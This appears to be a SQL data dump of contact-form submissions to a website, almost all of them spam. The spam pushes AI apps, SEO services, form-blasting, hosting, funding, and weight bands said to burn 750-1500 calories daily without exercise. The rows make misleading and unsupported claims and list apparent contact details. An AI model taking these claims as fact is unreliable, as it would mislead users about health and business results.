(20, 'Chelsea', 'Thompson', 'chelsea.thompson@goldrhinopromos.com', '', 'Hi.  My name is Chelsea Thompson and I’m trying to reach the person who’s responsible for company partnerships and collaborations. I\'m currently reaching out the companies in the automotive industry.\r\nI represent Gold Rhino Camper, and we\'re interested in discussing a potential partnership opportunity to work together to sell our new 2024/2025 travel trailers and truck campers. \r\nI believe they would complement your company\'s offerings and provide added value to your customers. \r\nIf you\'re open to exploring this opportunity further, please feel free to reach out to me.  \r\nThey can be seen at goldrhinopromos.com and I can be reached at chelsea.thompson@goldrhinopromos.com.  \r\nThanks so much.  ~Chelsea'),
(21, 'James', 'Durham', 'alebooksuite@vaulemedia.com', '', 'Let’s agree on one thing…\r\n\r\nWhatever we want in life, we want it fast…\r\n\r\nNo one likes to wait for the results they desire…\r\n\r\nThis is why people love stuff like microwaves, magic diet pills, and so on…\r\n\r\nAnd when it comes to making money, there is no difference…\r\n\r\nWe don’t want to wait ages to make money…\r\n\r\nAnd this is exactly why im excited to show you what I have for you today…\r\n\r\nYou see, my friend Yogesh just opened the door to his newest AI app called AleBookSuit…\r\n\r\nIt’s the world’s first AI app that can generate engaging and addictive ebooks, flipbooks, crosswords, puzzles, and more: https://www.vaulemedia.com/alebooksuite\r\n\r\nIn less than 90 seconds…\r\n\r\nAnd not just generate them…\r\nBut design them into a jaw-dropping creation that will stun your customers…\r\n\r\nAll of that…\r\n\r\nWithout you writing a single word\r\nWithout you designing anything\r\nWithout you promoting anything\r\n\r\nYes, you don’t even to promote it…\r\n\r\nBecause, my friend…\r\n\r\nAleBookSuite will even do that for you…\r\n\r\nIt’s my friend Yogesh’s newest creation…\r\n\r\nAnd this AI beast will also promote your ebook or flipbook for you…\r\nAllowing you to dominate ANY platform you want…\r\n\r\nWithout you paying anything upfront\r\nWithout requiring any experience\r\nWithout doing any manual work\r\n\r\nRight now you can create your account with AleBookSuite by clicking here: https://www.vaulemedia.com/alebooksuite\r\n\r\nAnd you will instantly unlock a huge bonus pack that is worth thousands of dollars (real value)\r\n\r\nCheers,\r\nJames Durham\r\n\r\nPS: Yogesh is only giving away a limited number of copies of AleBookSuite… So you better click here fast: https://www.vaulemedia.com/alebooksuite\r\n\r\n\r\n\r\nUNSUBSCRIBE: https://www.vaulemedia.com/unsubscribe\r\nAddress: 811 Jefferson Street\r\nHampton, VA 23666'),
(22, 'Roberto', 'Evers', 'gptreels@busitoday.co', '', 'With GPTReels, you can create video reels in Flash (literally a few seconds) and sell it to unlimited clients - earn good profits for your services\r\n\r\nMore than 78% business owners rate using AI based reels as the #1 way to attract more visitors & convert them into happy customers.\r\n\r\nBut creating video reels was a very tough, energy-draining, time-consuming, and costly process.\r\n\r\nYes!\r\n\r\nThere are tons of tasks involved & missing even a single one leads to a complete rework right from scratch.\r\n\r\nNow, If you too wanna get a complete all-in-one solution for this menace…\r\n\r\nI’ve got some great news… Presenting GPT Reels\r\n\r\n[+] Creates Pro Quality Video Reels in seconds for any business in any language\r\n[+] First Video Reels Creator powered by GPT-4 AI Technology\r\n\r\n==> Show live demo : https://www.busitoday.co/gptreels \r\n\r\nA.I Does A to Z Steps To Create Beautiful Video Reels! Just Enter Keywords and It Will Give You...\r\n\r\nIdeas & Help Writing Scripts\r\nFinding Relevant Videos & Images\r\nAdd Powerful Animation\r\nAdd Mesmerizing Music\r\nCreate Attractive Reels, Videos & Shorts\r\n\r\nBe it Website Videos, Ads, Promotional, Entertaining, Infomercial, Advertising, Learning Video…\r\n\r\nBig marketers are calling GPT Reels as BESTEST and FASTEST A.I Video Reel Creator in the new age of A.I era\r\n\r\nImagine creating any type of video reels in seconds\r\n\r\n...WITHOUT skills,\r\n...WITHOUT recording a single video\r\n...WITHOUT any budget\r\n...By entering just one Keyword and literally 3-clicks\r\n\r\nBEST Part Is: It comes with a commercial license, which means You can create video reels in Flash (literally a few seconds) and sell it to unlimited clients - earn good profits for your services\r\n\r\nNot to mention, GPT Reels has a 30-days money-back guarantee if you don\'t like it.\r\n\r\nOver 5000 business owners have bought GPT Reels lifetime deals in the last few days...\r\n\r\n==> Get GPT Reels Lifetime account at a one-time price now : https://www.busitoday.co/gptreels \r\n\r\nRegards,\r\nRoberto Evers\r\n\r\n\r\n\r\nUNSUBSCRIBE: https://www.busitoday.co/unsubscribe \r\nAddress: 3749 Skinner Hollow Road\r\nOxbow, OR 97840'),
(23, 'Theresa', 'Smith', 'elke.lammon@gmail.com', '', 'Would you like to burn 750-1500 calories a day without having to work out? If yes, we have a solution, and if you order today, you will Get One FREE!\r\n\r\nWe created the first ever, luxury, all-day-wearable weight bands that goes on your wrist, ankles, & waist. The great thing is, they look stylish, super sexy, and you can wear them with any outfit.\r\n\r\nPlus, we make it easy to burn calories, you just put them on in the morning and go about your day, then take them off at night. You’ll burn calories, shed pounds, build muscle, improve your cardiovascular system, increase endurance, and gain more flexibility at the same time.  Plus! If you go for a walk or hit the gym you can burn even more calories. \r\n\r\nNow is your chance to get the body you always dreamed of, and because we will give you one full set absolutely FREE, you can give your free gift to a friend or family member and lose weight together. \r\n\r\nWhat are you waiting for, get started today. Go Here: https://bit.ly/elebands-special-bogo\r\n \r\nJoin thousands of people who have lost weight in a natural way. We have full body sets (wrist, ankle, waist) in 5, 10, 15, 20, 25 and 30 pounds (per set) so no matter your fitness goals we have you covered. \r\n\r\nStart getting results NOW!, the smart and easy way!!\r\n\r\nOUR BANDS HELP YOU TO: \r\n\r\n- Burn calories all-day\r\n- Have a sculpted body\r\n- Slim down all over\r\n- Tighten glutes\r\n- Tone your calves \r\n- Firm up abs\r\n\r\nMany of our clients are losing 2-3 pounds every week and getting major health benefits just by going about their day and handling business as usual. \r\n\r\nWhat are you waiting for, get started today. Go Here: https://bit.ly/elebands-special-bogo\r\n'),
(24, 'Phil', 'Stewart', 'noreplyhere@aol.com', '', 'Hey, looking to boost your ad game? Picture your message hitting website contact forms worldwide, grabbing attention from potential customers everywhere! Starting at just under a hundred bucks my budget-friendly packages are designed to make an impact. Drop me an email now to discuss how you can get more leads and sales now!\r\n\r\nP. Stewart\r\nEmail: ya5eja@submitmaster.xyz\r\nSkype: form-blasting'),
(25, 'Justine', 'Tolmie', 'tolmie.justine@yahoo.com', '', 'Hi there,\r\n\r\nAre you tired of paying monthly fees for website hosting, cloud storage, and funnels?\r\n\r\nWe offer a revolutionary solution: host unlimited websites, files, and videos for a single, low one-time fee. No more monthly payments.\r\n\r\nLearn more: https://furtherinfo.org/0wg3\r\n\r\nHere\'s what you get:\r\n\r\nUltra-fast hosting powered by Intel® Xeon® CPU technology\r\nUnlimited website hosting\r\nUnlimited cloud storage\r\nUnlimited video hosting\r\nUnlimited funnel creation\r\nFree SSL certificates for all domains and files\r\n99.999% uptime guarantee\r\n24/7 customer support\r\nEasy-to-use cPanel\r\n365-day money-back guarantee\r\n\r\nPlus, get these exclusive bonuses when you act now:\r\n\r\n60+ reseller licenses (sell hosting to your clients!)\r\n10 Fast-Action Bonuses worth over $19,997 (including AI tools, traffic generation, and more!)\r\n\r\nDon\'t miss out on this limited-time offer! The price is about to increase, and this one-time fee won\'t last forever.\r\n\r\nClick here to learn more: https://furtherinfo.org/0wg3\r\n\r\nJustine'),
(26, 'Mei', 'Hoadley', 'mei.hoadley@gmail.com', '', ' \r\nPeople + Processes + Capital = The Recipe for Business Success\r\n\r\nHowever most small business owners put little thought into the capital needed to scale and grow their business.\r\n\r\nIf you have the people & the business processes in place but no access to working capital, then your business will be stuck in neutral.\r\n\r\nGet a no obligation working capital quote in less than 2 minutes. \r\n\r\n== Must Be A US Based Business To Qualify ==\r\n\r\nGet in touch with me below for more info\r\n\r\nElizabeth Miller\r\nelizabeth.miller@helloratesfastfunding.com\r\nhttps://www.helloratesfastfunding.com\r\n\r\n\r\n'),
(27, 'Steven', 'Toussaint', 'coursiify@truevaule.xyz', '', 'Hi,\r\n\r\nIt\'s time to explore AI and reap the rewards.\r\n\r\nImagine waking up to a fully loaded course platform in any niche with a marketplace to sell them.\r\n\r\nImagine owning an Udemy-like platform worth over $100 million.\r\n\r\nYou may be laid back because this isn\'t easy…\r\n\r\nCreating a platform like Udemy can cost a ton and they need experts to record courses.\r\n\r\nWhat if you can skip all that?\r\n\r\nIntroducing Coursiify: https://www.truevaule.xyz/coursiify \r\n\r\nThe First To Market AI Virtual Assistants-Sonia Leverages Machine Learning To Turn Any Keyword Into Full E-Learning Platforms In Seconds…\r\n\r\nWith Coursiify you will get:\r\n\r\nExpertly Crafted Courses\r\nAttractive Designs\r\nZero Coding e-learning platform\r\nAn Inbuilt marketplace to market and sell all courses for you without any effort.\r\nAnd so much more.\r\n\r\nExcitedly,\r\n\r\nYou are still early and can get all amazing offers…\r\n\r\nBonuses Worth 6k+ for you here: https://www.truevaule.xyz/coursiify \r\n\r\nDon\'t miss out.\r\n\r\nGet Coursiify Here & Watch it work for you: https://www.truevaule.xyz/coursiify \r\n\r\nSee you inside\r\nSteven Toussaint\r\n\r\n\r\nUNSUBSCRIBE: https://www.truevaule.xyz/unsubscribe \r\nAddress: 2281 Hillside Drive\r\nWest Roxbury, MA 02132\r\n'),
(28, 'Owen', 'Vega', 'aichildrens@solveques.xyz', '', 'Dear vendorscity.com,\r\n\r\nDo you know that the children\'s book market is an untapped gold mine?   According to recent data, it\'s a booming $4 billion industry in the US alone!\r\n\r\nDid you also know that an increasing number of parents and educators are turning to online platforms to find engaging and educational children\'s books?   Over 60% of children\'s books are now purchased online!\r\n\r\nNow, here\'s the real kicker: with the brand new A.I. Children\'s Book Maker, you can easily tap into this lucrative market:\r\n\r\nhttps://www.solveques.xyz/aichildrens \r\n\r\nThis innovative web app uses artificial intelligence to write and illustrate high-quality children\'s books in just minutes.   No need for writing or illustrating skills.   Just input your idea and let the AI bring your story to life.\r\n\r\nImagine creating a unique product for this thriving market, without the traditional overhead costs of book publishing.   This could open up a significant new revenue stream for you.\r\n\r\nDon\'t miss out on this.   The launch special will be ending soon:\r\n\r\nhttps://www.solveques.xyz/aichildrens \r\n\r\nTry the A.I. Children\'s Book Maker today and take your entrepreneurial journey to the next level.\r\n\r\nTo your success,\r\n\r\nOwen Vega\r\n\r\n\r\n\r\nUNSUBSCRIBE: https://www.solveques.xyz/unsubscribe/?d=vendorscity.com \r\nAddress: 4180 Mayo Street\r\nLexington, KY 40509'),
(29, 'Mike Attwood\r\n', 'Mike Attwood\r\n', 'miketrauttToxastof@gmail.com', '89581391399', 'This service is perfect for boosting your local business\' visibility on the map in a specific location. \r\n \r\nWe provide Google Maps listing management, optimization, and promotion services that cover everything needed to rank in the Google 3-Pack. \r\n \r\nMore info: \r\nhttps://www.speed-seo.co/ranking-in-the-maps-means-sales/ \r\n \r\nThanks and Regards \r\nMike Attwood\r\n \r\nhttps://www.speed-seo.co/whatsapp-us/'),
(30, 'Rosella', 'Ortiz', 'ortiz.rosella@outlook.com', '', 'A local store or a multinational chain, we build mobile Apps at crazy prices. We convert your website into an App.\r\n\r\nAndroid ($50)\r\niOS ($50)\r\n\r\nGet your free consultation here:\r\n\r\nhttps://forms.gle/hbayvMrG3N7u2Rbu9'),
(31, 'Mike Lewin\r\n', 'Mike Lewin\r\n', 'mikeGroorn@gmail.com', '84263225525', 'Hi there, \r\n \r\nMy name is Mike from Monkey Digital, \r\n \r\nAllow me to present to you a lifetime revenue opportunity of 35% \r\nThat\'s right, you can earn 35% of every order made by your affiliate for life. \r\n \r\nSimply register with us, generate your affiliate links, and incorporate them on your website, and you are done. It takes only 5 minutes to set up everything, and the payouts are sent each month. \r\n \r\nClick here to enroll with us today: \r\nhttps://www.monkeydigital.co/join-affiliates/ \r\n \r\nThink about it, \r\nEvery website owner requires the use of search engine optimization (SEO) for their website. This endeavor holds significant potential for both parties involved. \r\n \r\nThanks and regards \r\nMike Lewin\r\n \r\nMonkey Digital \r\nhttps://www.monkeydigital.co/whatsapp-affiliates/'),
(32, 'Harvey', 'Walczak', 'gptreels@enterprisetoday.info', '', 'Hi there,\r\n\r\nDid you get your copy of GPT Reels (With a Commercial + Agency License yet)?\r\n\r\nIf not yet, then this is your final and last chance to get GPT Reels at a 1-Time Price.\r\n\r\n=> Click Here & Grab This Now Before it goes RECURRING : https://www.enterprisetoday.info/gptreels \r\n\r\nNever run out of high quality pro video reels.\r\n\r\nLet AI create unlimited video reels in a flash.\r\n\r\nGPT Reels does ALL the Heavy Lifting by:\r\nCreating Ideas and scripts\r\nUsing its Built-In Storyboarding Feature\r\nFinding relevant images & video\r\nAdding animations & music\r\nAdd epic voice overs\r\nVia 100\'s of DFY templates or building from scratch...\r\n\r\n==>> Click Here To Grab GPT Reels + MY Bonuses: https://www.enterprisetoday.info/gptreels \r\n\r\nNote: This is turning into monthly recurring very soon.\r\n\r\nRegards,\r\nHarvey Walczak\r\n\r\n\r\nUNSUBSCRIBE: https://www.enterprisetoday.info/unsubscribe/?d=vendorscity.com \r\nAddress: 3337 Thorn Street\r\nCheyenne, WY 82001'),
(33, 'Mike Milton\r\n', 'Mike Milton\r\n', 'mikeToxIcepe@gmail.com', '87959133475', 'Hi there, \r\n \r\nI have reviewed your domain in MOZ and have observed that you may benefit from an increase in authority. \r\n \r\nOur solution guarantees you a high-quality domain authority score within a period of three months. This will increase your organic visibility and strengthen your website authority, thus making it stronger against Google updates. \r\n \r\nCheck out our deals for more details. \r\nhttps://www.monkeydigital.co/domain-authority-plan/ \r\n \r\n \r\nThanks and regards \r\nMike Milton\r\n \r\nMonkey Digital \r\nhttps://www.monkeydigital.co/whatsapp-us/'),
(34, 'Betty', 'Mackinolty', 'betty.mackinolty@gmail.com', '', 'Businesses in the Vetted Business Directory & Portal close up to 60% more sales due to amplified trust, transparency and credibility.\r\n\r\nGetting Vetted is easy and over 7,000 businesses were added to the platform in May.\r\n\r\nYour business was unfortunately NOT INCLUDED :-(\r\n\r\nDon’t worry, this is easy to fix.\r\n \r\nUse the link in my signature to add or update your Vetted business details and fully realize the powerful benefits of being a Vetted Business in your local market, your service category and your business specialty.\r\n\r\nYours in trust & transparency,\r\n\r\nSarah McCormick\r\nVetted Business Specialist\r\n295 Seven Farms Drive Suite C-201\r\nCharleston, SC 29492\r\nSarah.McCormick@VettedPros.com\r\nhttps://vettedpros.com/1-2/?a=Get-Your-Business-Vetted!\r\n\r\nVetted is a game changing platform used by over 85,000 USA based businesses to share & prove their business credentials to amplify trust & transparency with shoppers and close up to 60% more sales than businesses not listed on the Vetted platform.\r\n'),
(35, 'Elisa', 'Allen', 'aipilot@realdollar.xyz', '', '\r\nWhat is your business struggle?\r\n\r\nTraffic?\r\n\r\nWithout traffic, you can\'t sell and if you don\'t sell, how do you make money?\r\n\r\nInstead of paying through the nose, running expensive ads and SEO that will attract few clicks,\r\n\r\nI have a tool that does it all.\r\n\r\nAI Pilot AI is a hot tool that turns your business ideas into a profitable business making you money every day in one click and driving insane traffic to you.\r\n\r\nSee how it works in 3 steps here: https://www.realdollar.xyz/aipilot \r\n\r\nAI Pilot AI is the first-ever tool that leverages AI to drive unlimited traffic for instant clicks.\r\n\r\nHow do you convert these traffic to buyers?\r\n\r\nAI Pilot AI is equipped with unbelievable AI tools that help convert your clicks to sales.\r\n\r\nGet AI Pilot AI And Enjoy Unlimited Traffic To Sales Here: https://www.realdollar.xyz/aipilot \r\n\r\nAI Pilot AI is a huge combo of AI Pilot-cutting AI tools such as:\r\n\r\n-AI assistant\r\n-voiceover generator\r\n-Generates flipbooks\r\n-interactive elements for website, blogs, ecom store, and more\r\n-social proof generator, content generator, codes, designs, and more\r\n\r\nSee what AI Pilot AI can do for you:\r\n\r\nDeploy AI Bots that will handle your business from scratch to profit on any niche in one click\r\n\r\nGenerate complete Funnels, websites, business IDs, high-converting landing pages, and lots more in one click\r\n\r\nAccess and explore more than 85 AI features without any external login\r\n\r\nAccess the hot AI-powered traffic generator that will drive massive serious buyers to any site of choice in minutes.\r\n\r\nNever hire any assistant or team for your business, this super AI covers it all.\r\n\r\nAnd lots more\r\nSee more here: https://www.realdollar.xyz/aipilot \r\n\r\nYou will not believe bonuses waiting for you if you get AI Pilot AI in 24 hours…\r\n\r\nThis is crazy.\r\n\r\nGood luck to you!\r\n\r\nElisa Allen\r\n\r\n\r\nUNSUBSCRIBE: https://www.realdollar.xyz/unsubscribe/?d=vendorscity.com \r\nAddress: 3109 Oak Street\r\nEast Syracuse, NY 13057\r\n'),
(36, 'Keith', 'Steadman', 'nocostmethod@keydollar.xyz', '', 'Hey Entrepreneur,\r\n\r\n\r\nEver dreamed of diving into the world of online business without the hefty upfront costs?    Buckle up because our eBook, \"The No-Cost Method to Selling in 114 Hottest Niches and More,\" is your golden ticket—especially in the Wealth Niche.\r\n\r\nGet your hands on the eBook: : https://www.keydollar.xyz/nocostmethod \r\n\r\n\r\nHere’s why you’ll love it:\r\n\r\n?? **No Inventory Headaches**: Kiss buying inventory goodbye.    This method keeps your wallet happy.\r\n\r\n?? **Simple 3-Step Process**: Snag your free web store in just three easy moves.    Yep, it’s as simple as it sounds.\r\n\r\n?? **No Shipping Fiascos**: Forget shipping woes.    This business model doesn’t require you to lift a finger.\r\n\r\n?? **Quick & Foolproof**: Follow the easy-peasy instructions, and within an hour, you’re set to conquer the Wealth Niche!\r\n\r\nReady to turn your online aspirations into profits?    Don’t miss out!\r\n\r\nNeed more deets?    Click here: : https://www.keydollar.xyz/nocostmethod \r\n\r\n\r\nTo your wealth and success!\r\n\r\n\r\nKeith Steadman\r\n\r\n\r\nP.S. Start your journey NOW: : https://www.keydollar.xyz/nocostmethod \r\n\r\n\r\nUNSUBSCRIBE: https://www.keydollar.xyz/unsubscribe/?d=vendorscity.com  \r\nAddress: 2407 Powder House Road\r\nFort Lauderdale, FL 33301\r\n'),
(37, 'Tommie', 'Hawkins', 'coursiify@nowbusiness.info', '', 'Hi,\r\n\r\n$1,320 daily was a scratch for him lately and he can\'t help but share…\r\n\r\nAll he did was create an E-learning platform with fully loaded courses and sell in an Inbuilt marketplace with millions of users\r\n\r\nNo, he didn\'t have to code, get experts, or record any course.\r\n\r\nSee How Coursiify did it in seconds for him: https://www.nowbusiness.info/coursiify \r\n\r\nYou too can do so ok?  you just need to replicate and get more results.\r\n\r\nYou don\'t need to invest a dime...\r\n\r\nYou don\'t need to pay anyone to get your courses.\r\n\r\nYou don\'t need to worry about designs.\r\n\r\nCoursiify does this and more for you.\r\n\r\nWorried about making sales?\r\n\r\nNever worry about ads, that\'s Damn expensive.\r\n\r\nMarketing is fully DFY, Tap into the marketplace with millions of users and get users queuing in.\r\n\r\nJust relax like him and get paid every day with Coursiify AI.\r\n\r\nBefore I forget, the Commercial License is up only today.\r\n\r\nStart Now & Make $1k+ Today: https://www.nowbusiness.info/coursiify \r\n\r\nYou\'re gonna be glad you did.\r\n\r\nTommie Hawkins\r\n\r\n\r\nP.S. This is a lifetime opportunity for the lucky few, in a bit, this offer closes and you will pay high to get in.  Pay a low one-time fee and get in ASAP.\r\n\r\n\r\nUNSUBSCRIBE: https://www.nowbusiness.info/unsubscribe/?d=vendorscity.com  \r\nAddress: 2565 Rosewood Court\r\nHendricks, MN 56136\r\n'),
(38, 'Nathaniel', 'Joyner', 'joyner.nathaniel@hotmail.com', '', 'Businesses that get Vetted are running circles around their competition that continue pouring more money into leads & advertising.\r\nVetted builds essential trust, transparency & credibility to help you close up to 60% more deals eliminating the need to spend more on advertising or leads.\r\nStart your 30 Day FREE trial & see the results for yourself. \r\nUSA Businesses Only\r\n\r\nSarah McCormick\r\nVetted Business Specialist\r\n295 Seven Farms Drive Suite C-201\r\nCharleston, SC 29492\r\nSarah.McCormick@VettedPros.com\r\nhttps://vettedpros.com/1-2/?a=Get-Your-Vetted-30-DAY-FREE-TRIAL! \r\n\r\nVetted is a game changing platform used by over 85,000 USA based businesses to share & prove their business credentials to amplify trust & transparency with shoppers and close up to 60% more sales than businesses not listed on the Vetted platform.\r\n'),
(39, 'Janie', 'Mattos', 'gptreels@actionnow.xyz', '', 'Ok,\r\n\r\nUnless you’re living on Mars,\r\n\r\nYou must be aware of the fact that video reels have dominated the industry from tip to toe.\r\n\r\n& its also highlighted by the fact that…\r\n\r\n68% of Fortune 500 companies use video reels for engaging their audience.\r\n\r\nSounds interesting…\r\n\r\nYou’re at the right place today as…\r\n\r\nI am talking about a completely automated process that \"Writes\", \"Composes\",\r\n\r\nand \"Publishes\" video reels using nothing but a keyword.\r\n\r\nNot ordinary video reels, but pro high-quality video reels with images, videos, text, and even animations,\r\n\r\nALL DONE FOR YOU. GPT Reels does it ALL.\r\n\r\n==> Show live demo : https://www.actionnow.xyz/gptreels \r\n\r\nCreating a video with GPT Reels is easy:\r\n\r\nStep 1: Enter a keyword, text, or URL as input or select from templates\r\nStep 2: Let AI create a video reel or customize using a drag-n-drop editor\r\nStep 3: Hit RENDER and publish\r\n\r\nBe it Website Videos, Ads, Promotional, Entertaining, Infomercial, Advertising, Learning Video...\r\n\r\nEnter Keyword, and GPT Reels will\r\n\r\n1. Give ideas and suggest topics\r\n2. Write scripts\r\n3. Create scenes and designs (adds stock images, videos, animation, and music automatically)\r\n4. Does the epic voice-over\r\n5. Produce quality video reels in any style in any language\r\n\r\nNot just that, It has a URL Video Reel Creator.\r\n\r\nIt takes your website, scans for the content, turns that into slides AUTOMATICALLY, and your Video reels are ready.\r\n\r\nYour audience will be amazed!\r\n\r\nWith Commercial License: create video reels, sell them to unlimited clients- earn good profits for your services.\r\n& you’re also getting an iron clad 30 day money back guarantee included.\r\n\r\nSo,\r\n\r\nThere’s nothing to worry about now…\r\n\r\nHit the button & get GPT Reels with premium B0nuses today…\r\n\r\n==> Get a GPT Reels Lifetime account at a one-time price now : https://www.actionnow.xyz/gptreels \r\n\r\nRegards,\r\nJanie Mattos\r\n\r\n\r\nUNSUBSCRIBE: https://www.actionnow.xyz/unsubscribe/?d=vendorscity.com \r\nAddress: 4551 Sugar Camp Road\r\nEyota, MN 55934'),
(40, 'James', 'Flint', 'aipilot@vauleonline.co', '', 'Are you tired of spending endless hours designing, coding, and crafting funnels, websites, and landing pages?\r\n\r\nImagine if you could do all of this with just one keyword.\r\n\r\nIntroducing AI Pilot AI App, the groundbreaking solution that is set to reshape the way you create, innovate, and dominate the online marketing world.\r\n\r\nWhether you are an affiliate marketer, an eCom store owner,  an Internet Marketer or any business you do online,\r\n\r\n>> Grab AI Pilot Here to revolutionize your online business: https://www.vauleonline.co/aipilot \r\n\r\nWith AI Pilot AI App, you\'re not just staying ahead of the curve - you\'re redefining it!\r\n\r\nYou can Generate Social Proof, Generate Business ID, Create A Funnel, Create A Website, Create A Landing Page, Generate Content, Generate Codes, Generate Chatbots, Generate 3D Models,   Generate Videos, and make a profit.\r\n\r\nNo complex setups and endless configurations, No more manual work, no more writing, designing, or coding.\r\n\r\n>> Click Here To Get AI Pilot Now - Limited Time OFFER: https://www.vauleonline.co/aipilot \r\n\r\nThis works 100 times better and smarter than popular ChatGpt and a Google Bard tech AI, with 99.99% uptime guarantee, Zero downtime for life.\r\n\r\nThat’s not the end,\r\n\r\nJust like Siri, AI Pilot AI App responds to your voice commands, translating your ideas into reality with unmatched ease.\r\n\r\nYou can also attract more potential customers to your doorstep easily.\r\n\r\nUltimately, you can watch your audience grow as the AI optimizes your outreach and engagement strategies.\r\n\r\n>> Click Here To Get AI Pilot Now - Limited Time OFFER: https://www.vauleonline.co/aipilot \r\n\r\nI’ll see you on the inside!\r\nJames Flint\r\n\r\n\r\nUNSUBSCRIBE: https://www.vauleonline.co/unsubscribe/?d=vendorscity.com \r\nAddress: 2551 Morningview Lane\r\nKanawha, IA 50447\r\n'),
(41, 'Marcos', 'Hentze', 'hentze.marcos@googlemail.com', '', 'Hi there, my name is Cody Griner. I apologize for using your contact form, \r\nbut I wasn\'t sure who the right person was to speak with in your company. \r\nWe have a patented application that creates Local Area pages that rank on \r\ntop of Google within weeks, we call it Local Magic.  Here is a link to the \r\nproduct page https://www.mrmarketingres.com/local-magic/ . The product \r\nleverages technology where these pages are managed dynamically by AI and \r\nit is ideal for promoting contractors on Google.  Can I share a testimonial \r\nfrom one of our clients with you?  I can also do a short zoom to \r\nillustrate their full case study if you have time for it? \r\ncody@mrmarketingres.com 843-720-7301'),
(42, 'Cole', 'Telfer', 'telfer.cole75@gmail.com', '', 'Say goodbye to endless hours of SEO research and ineffective strategies!\r\n\r\nWatch me Rank On Page #1 In 60 Seconds\r\n\r\nAnd Get INSTANT TARGETED VISITORS\r\n\r\nVisit http://FreeTrafficPro.com\r\n\r\nDominate Rankings effortlessly\r\n\r\nIncrease your subscriber base\r\n\r\nUnlock the full potential of your content\r\n\r\nDon\'t miss out on this game-changing tool!\r\n\r\nVisit http://FreeTrafficPro.com'),
(43, 'Kevin', 'Arriaga', 'aidualspremium@kagrowth.org', '', 'Hey,\r\n\r\nImagine commanding an elite team of AI-powered clones, ready to tackle any business challenge without the ongoing costs associated with a traditional workforce.\r\n\r\nYou can simply clone yourself and let the clone do ALL the work for you while you relax and have your free time.\r\n\r\nThat’s possible with AIDuals - where we make this a reality, offering you seamless automation at a fraction of the cost.\r\n\r\n: https://www.kagrowth.org/aidualspremium\r\n\r\nAIDuals is your solution to the biggest hurdles in business growth:\r\n\r\n?? Commercial Rights to use AI clones.\r\n?? Over 100 AI clones at your disposal.\r\n?? Handle countless tasks with precision.\r\n?? Multilingual capabilities for global reach.\r\n?? Interact with clones in dynamic 2-way conversations.\r\n?? Customize your clones’ working hours, tasks, and interaction styles.\r\n?? Embed your AI clones directly onto your platforms.\r\n?? Benefit from top-tier encryption ensuring 100% privacy.\r\n??? Enjoy dedicated support, regular updates, and comprehensive training.\r\n\r\nAs an extra incentive, this offer includes an exclusive webinar on leveraging AIDuals for rapid revenue generation!\r\n\r\nThis unbeatable deal is only available for the next few hours, with a one-time payment and no recurring fees.\r\n\r\n: https://www.kagrowth.org/aidualspremium\r\n\r\nPlus, I\'m throwing in exclusive bonuses to enhance your AIDuals experience even more\r\n\r\nDon\'t miss out on this transformative opportunity to revolutionize how you manage and grow your business with AI.\r\n\r\nThis limited-time offer is your ticket to staying ahead in the competitive business landscape.\r\n\r\n: https://www.kagrowth.org/aidualspremium\r\n\r\nTo Your Success,\r\nKevin Arriaga\r\n\r\n\r\nUNSUBSCRIBE: https://www.kagrowth.org/unsubscribe/?d=vendorscity.com \r\nAddress: 2997 Poling Farm Road\r\nOmaha, NE 68137'),
(44, 'Michael', 'Homan', 'tubetriviaai@earnmorenow.info', '', 'Hi,\r\n\r\nIf you\'re still busting your a** trying to make Free traffic work...\r\n\r\nOR Spending way too much money on paid ads like Facebook, Google..\r\n\r\nThere there is a much better, easier way to generate 100,000s of free visitors per month...\r\n\r\n...  using a *NEW & UNIQUE AI HACK* that 99.99% people still have NO IDEA ABOUT using 45 sec AI video quizzes!\r\n\r\n==> See how they generating millions of views with 30 sec quiz videos (PROOF Inside): https://www.earnmorenow.info/tubetriviaai\r\n\r\n\r\nHere\'re some of the results people getting with quiz videos..\r\n\r\n- 1M views on a DOG CARE quiz\r\n- 3.6M views on a GK quiz\r\n- 4.5M views on a MOVIE quiz\r\n- 1.1M views on MAKEUP quiz\r\n- 921k views on a M0NEY quiz\r\n\r\nTurn all these views & traffic into commissions by sending them to Affiliate & CPA offers, ecom products, services & even build huge email lists..\r\n\r\nTubeTrivia AI is the 1st and ONLY Software that creates 100s of viral & engaging Quiz  videos in just minutes with a SINGLE keyword...\r\n\r\n..  that drive traffic & sales to your websites, blogs, and offers in just 3 clicks..\r\n\r\nSTEP 1 - Enter a keyword and our AI will generate 100s of viral Quiz Ideas using our \"3E  Formula- Engage, Excite, Explode\".\r\n\r\nSTEP 2 - Select from library of professional, high quality Video Quiz templates & customise everything from color, font, background, video clips & more.\r\n\r\nSTEP 3 - Publish 1 or all your videos directly to YouTube, Instagram, TikTok or anywhere and watch the traffic, followers & sales pour In 24X7!\r\n\r\nTubeTrivia AI is the 1st & Only AI Quiz Builder online, there is nothing like it - grab your UNFAIR advantage now:\r\n\r\n==> WATCH QUICK DEMO HERE : https://www.earnmorenow.info/tubetriviaai \r\n\r\nTubeTrivia AI is available for a Low One Time Price during its public launch for the next few days only..\r\n\r\nAfter this week, it will turn into a higher recurring subscription price model.\r\n\r\nAct fast and get your account at the lowest price ever.\r\n\r\n==> Get TubeTrivia AI For A Low One-Time Price Now : https://www.earnmorenow.info/tubetriviaai \r\n\r\nSee you inside.\r\n\r\nAll the best\r\nMichael Homan\r\n\r\n\r\nUNSUBSCRIBE: https://www.earnmorenow.info/unsubscribe/?d=vendorscity.com \r\nAddress: 4025 Chandler Drive\r\nJoplin, MO 64801'),
(45, 'Vincentmex', 'Vincentmex', 'latishakingston@hotmail.com', '85251958762', 'Are you a driven salesperson looking for your next big opportunity? Look no further! https://SellAccs.net is seeking passionate individuals to join our team. With our revolutionary platform for buying and selling online accounts, you\'ll have a cutting-edge product to pitch to a vast market. Enjoy lucrative commissions, ongoing training, and unparalleled support as you help reshape the digital commerce landscape. Join us today and embark on a rewarding sales journey with https://SellAccs.net! \r\n \r\n \r\nVISIT THE FOLLOWING PAGE: https://SellAccs.net'),
